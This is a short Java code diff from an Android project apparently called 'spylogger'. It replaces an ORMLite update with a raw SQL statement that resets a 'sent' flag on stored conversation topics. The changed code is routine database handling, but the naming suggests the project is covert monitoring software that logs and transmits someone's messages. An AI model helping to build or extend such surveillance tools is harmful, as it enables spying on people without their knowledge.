@@ -5,7 +5,6 @@ import android.content.Context;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioGenerico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
-import com.j256.ormlite.stmt.UpdateBuilder;
 import com.j256.ormlite.table.TableUtils;
 
 import java.sql.SQLException;
@@ -34,9 +33,10 @@ public class RepositorioTopicoImpl extends RepositorioGenerico<Topico> implement
 	@Override
 	public void reativar() {
 		try {
-			UpdateBuilder<Topico, Integer> ub = database.updateBuilder();
+			database.executeRawNoArgs("update topico set enviado=0 ");
+			/*UpdateBuilder<Topico, Integer> ub = database.updateBuilder();
 			ub.updateColumnValue("enviado", false);
-			ub.update();
+			ub.update();*/
 		} catch (SQLException e) {
 			e.printStackTrace();
 		}
